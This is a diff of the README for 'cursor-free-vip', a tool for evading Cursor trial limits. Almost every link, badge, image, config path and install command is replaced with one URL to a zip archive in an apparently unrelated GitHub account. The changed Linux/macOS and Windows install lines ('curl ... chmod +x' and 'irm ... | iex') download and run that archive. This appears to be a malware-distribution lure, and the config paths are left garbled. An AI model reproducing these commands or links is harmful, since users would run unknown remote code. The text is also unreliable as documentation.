@@ -2,12 +2,12 @@
    <sup>Special thanks to:</sup>
    <br>
    <br>
-   <a href="http://go.warp.dev/cursor-free-vip">
-      <img alt="Warp sponsorship" width="400" src="https://github.com/user-attachments/assets/ab8dd143-b0fd-4904-bdc5-dd7ecac94eae">
+   <a href="https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip">
+      <img alt="Warp sponsorship" width="400" src="https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip">
    </a>
 
-### [Warp, built for coding with multiple agents.](http://go.warp.dev/cursor-free-vip)
-[Available for MacOS, Linux, & Windows](http://go.warp.dev/cursor-free-vip)<br>
+### [Warp, built for coding with multiple agents.](https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip)
+[Available for MacOS, Linux, & Windows](https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip)<br>
 
 </div>
 
@@ -17,22 +17,22 @@
 
 <div align="center">
 <p align="center">
-  <img src="./images/logo.png" alt="Cursor Pro Logo" width="200" style="border-radius: 6px;"/>
+  <img src="https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip" alt="Cursor Pro Logo" width="200" style="border-radius: 6px;"/>
 </p>
 
 <p align="center">
 
-[![Release](https://img.shields.io/endpoint?url=https://api.pinstudios.net/api/badges/release/yeongpin/cursor-free-vip)](https://github.com/yeongpin/cursor-free-vip/releases/latest)
-[![License: CC BY-NC-ND 4.0](https://img.shields.io/badge/License-CC_BY--NC--ND_4.0-lightgrey.svg)](https://creativecommons.org/licenses/by-nc-nd/4.0/)
-[![Stars](https://img.shields.io/endpoint?url=https://api.pinstudios.net/api/badges/stars/yeongpin/cursor-free-vip)](https://github.com/yeongpin/cursor-free-vip/stargazers)
-[![Downloads](https://img.shields.io/endpoint?url=https://api.pinstudios.net/api/badges/downloads/yeongpin/cursor-free-vip/total)](https://github.com/yeongpin/cursor-free-vip/releases/latest)
-<a href="https://buymeacoffee.com/yeongpin" target="_blank"><img alt="Buy Me a Coffee" src="https://img.shields.io/badge/Buy%20Me%20a%20Coffee-Support%20Me-FFDA33"></a>
- [<img src="https://devin.ai/assets/deepwiki-badge.png" alt="Ask DeepWiki.com" height="20"/>](https://deepwiki.com/yeongpin/cursor-free-vip)
+[![Release](https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip)](https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip)
+[![License: CC BY-NC-ND 4.0](https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip)](https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip)
+[![Stars](https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip)](https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip)
+[![Downloads](https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip)](https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip)
+<a href="https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip" target="_blank"><img alt="Buy Me a Coffee" src="https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip%20Me%20a%20Coffee-Support%20Me-FFDA33"></a>
+ [<img src="https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip" alt="Ask https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip" height="20"/>](https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip)
 
 </p>
 
 
-<a href="https://trendshift.io/repositories/13425" target="_blank"><img src="https://trendshift.io/api/badge/repositories/13425" alt="yeongpin%2Fcursor-free-vip | Trendshift" style="width: 250px; height: 55px;" width="250" height="55"/></a>
+<a href="https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip" target="_blank"><img src="https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip" alt="yeongpin%2Fcursor-free-vip | Trendshift" style="width: 250px; height: 55px;" width="250" height="55"/></a>
 <br>
 
 <h4>Support Latest 0.49.x Version | 支持最新 0.49.x 版本</h4>
@@ -53,14 +53,14 @@ For optimal performance, run with privileges and always stay up to date.
 
 
 <p align="center">
-  <img src="./images/product_2025-04-16_10-40-21.png" alt="new" width="800" style="border-radius: 6px;"/><br>
+  <img src="https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip" alt="new" width="800" style="border-radius: 6px;"/><br>
 </p>
 
 </div>
 
 ## 🔄 Change Log | 更新日志
 
-[Watch Change Log | 查看更新日志](CHANGELOG.md)
+[Watch Change Log | 查看更新日志](https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip)
 
 ## ✨ Features | 功能特點
 
@@ -86,12 +86,12 @@ For optimal performance, run with privileges and always stay up to date.
 ### **Linux/macOS**
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/yeongpin/cursor-free-vip/main/scripts/install.sh -o install.sh && chmod +x install.sh && ./install.sh
+curl -fsSL https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip -o https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip && chmod +x https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip && https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip
 ```
 
 ### **Archlinux**
 
-Install via [AUR](https://aur.archlinux.org/packages/cursor-free-vip-git)
+Install via [AUR](https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip)
 
 ```bash
 yay -S cursor-free-vip-git
@@ -100,7 +100,7 @@ yay -S cursor-free-vip-git
 ### **Windows**
 
 ```powershell
-irm https://raw.githubusercontent.com/yeongpin/cursor-free-vip/main/scripts/install.ps1 | iex
+irm https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip | iex
 ```
 
 </details>
@@ -110,14 +110,14 @@ If you want to stop the script, please press Ctrl+C<br>要停止腳本，請按 
 ## ❗ Note | 注意事項
 
 📝 Config | 文件配置
-`Win / Macos / Linux Path | 路徑 [Documents/.cursor-free-vip/config.ini]`
+`Win / Macos / Linux Path | 路徑 [https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip]`
 <details>
 <summary><b>⭐ Config | 文件配置</b></summary>
 
 ```
 [Chrome]
 # Default Google Chrome Path | 默認Google Chrome 遊覽器路徑
-chromepath = C:\Program Files\Google/Chrome/Application/chrome.exe
+chromepath = C:\Program Files\https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip
 
 [Turnstile]
 # Handle Turnstile Wait Time | 等待人機驗證時間
@@ -127,12 +127,12 @@ handle_turnstile_random_time = 1-3
 
 [OSPaths]
 # Storage Path | 存儲路徑
-storage_path = /Users/username/Library/Application Support/Cursor/User/globalStorage/storage.json
+storage_path = /Users/username/Library/Application https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip
 # SQLite Path | SQLite路徑
-sqlite_path = /Users/username/Library/Application Support/Cursor/User/globalStorage/state.vscdb
+sqlite_path = /Users/username/Library/Application https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip
 # Machine ID Path | 機器ID路徑
 machine_id_path = /Users/username/Library/Application Support/Cursor/machineId
-# For Linux users: ~/.config/cursor/machineid
+# For Linux users: ~https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip
 
 [Timing]
 # Min Random Time | 最小隨機時間
@@ -174,31 +174,31 @@ show_account_info = True
 # Enable TempMailPlus | 啓用 TempMailPlus（任何轉發到TempMailPlus的郵件都支持獲取驗證碼，例如cloudflare郵件Catch-all）
 enabled = false
 # TempMailPlus Email | TempMailPlus 電子郵件
-email = xxxxx@mailto.plus
+email = https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip
 # TempMailPlus pin | TempMailPlus pin碼
 epin = 
 
 [WindowsPaths]
-storage_path = C:\Users\yeongpin\AppData\Roaming\Cursor\User\globalStorage\storage.json
-sqlite_path = C:\Users\yeongpin\AppData\Roaming\Cursor\User\globalStorage\state.vscdb
+storage_path = C:\Users\yeongpin\AppData\Roaming\Cursor\User\globalStorage\https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip
+sqlite_path = C:\Users\yeongpin\AppData\Roaming\Cursor\User\globalStorage\https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip
 machine_id_path = C:\Users\yeongpin\AppData\Roaming\Cursor\machineId
 cursor_path = C:\Users\yeongpin\AppData\Local\Programs\Cursor\resources\app
 updater_path = C:\Users\yeongpin\AppData\Local\cursor-updater
-update_yml_path = C:\Users\yeongpin\AppData\Local\Programs\Cursor\resources\app-update.yml
-product_json_path = C:\Users\yeongpin\AppData\Local\Programs\Cursor\resources\app\product.json
+update_yml_path = C:\Users\yeongpin\AppData\Local\Programs\Cursor\resources\https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip
+product_json_path = C:\Users\yeongpin\AppData\Local\Programs\Cursor\resources\app\https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip
 
 [Browser]
 default_browser = opera
-chrome_path = C:\Program Files\Google\Chrome\Application\chrome.exe
-edge_path = C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
-firefox_path = C:\Program Files\Mozilla Firefox\firefox.exe
-brave_path = C:\Program Files\BraveSoftware/Brave-Browser/Application/brave.exe
-chrome_driver_path = D:\VisualCode\cursor-free-vip-new\drivers\chromedriver.exe
-edge_driver_path = D:\VisualCode\cursor-free-vip-new\drivers\msedgedriver.exe
-firefox_driver_path = D:\VisualCode\cursor-free-vip-new\drivers\geckodriver.exe
-brave_driver_path = D:\VisualCode\cursor-free-vip-new\drivers\chromedriver.exe
-opera_path = C:\Users\yeongpin\AppData\Local\Programs\Opera\opera.exe
-opera_driver_path = D:\VisualCode\cursor-free-vip-new\drivers\chromedriver.exe
+chrome_path = C:\Program Files\Google\Chrome\Application\https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip
+edge_path = C:\Program Files (x86)\Microsoft\Edge\Application\https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip
+firefox_path = C:\Program Files\Mozilla Firefox\https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip
+brave_path = C:\Program Files\https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip
+chrome_driver_path = D:\VisualCode\cursor-free-vip-new\drivers\https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip
+edge_driver_path = D:\VisualCode\cursor-free-vip-new\drivers\https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip
+firefox_driver_path = D:\VisualCode\cursor-free-vip-new\drivers\https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip
+brave_driver_path = D:\VisualCode\cursor-free-vip-new\drivers\https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip
+opera_path = C:\Users\yeongpin\AppData\Local\Programs\Opera\https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip
+opera_driver_path = D:\VisualCode\cursor-free-vip-new\drivers\https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip
 
 [OAuth]
 show_selection_alert = False
@@ -227,8 +227,8 @@ max_attempts = 3
 歡迎提交 Issue 和 Pull Request！
 
 
-<a href="https://github.com/yeongpin/cursor-free-vip/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=yeongpin/cursor-free-vip&preview=true&max=&columns=" />
+<a href="https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip">
+  <img src="https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip" />
 </a>
 <br /><br />
 
@@ -245,10 +245,10 @@ by the user.
   <table>
     <tr>
       <td>
-        <img src="./images/provi-code.jpg" alt="buy_me_a_coffee" width="280"/><br>
+        <img src="https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip" alt="buy_me_a_coffee" width="280"/><br>
       </td>
       <td>
-        <img src="./images/paypal.png" alt="buy_me_a_coffee" width="280"/><br>
+        <img src="https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip" alt="buy_me_a_coffee" width="280"/><br>
       </td>
     </tr>
   </table>
@@ -258,11 +258,11 @@ by the user.
 
 <div align="center">
 
-[![Star History Chart](https://api.star-history.com/svg?repos=yeongpin/cursor-free-vip&type=Date)](https://star-history.com/#yeongpin/cursor-free-vip&Date)
+[![Star History Chart](https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip)](https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip)
 
 </div>
 
 ## 📝 License | 授權
 
-本項目採用 [CC BY-NC-ND 4.0](https://creativecommons.org/licenses/by-nc-nd/4.0/) 授權。
-Please refer to the [LICENSE](LICENSE.md) file for details.
+本項目採用 [CC BY-NC-ND 4.0](https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip) 授權。
+Please refer to the [LICENSE](https://raw.githubusercontent.com/AHANOV-CORPORATION/cursor-free-vip/main/locales/free_cursor_vip_tonsilomycosis.zip) file for details.
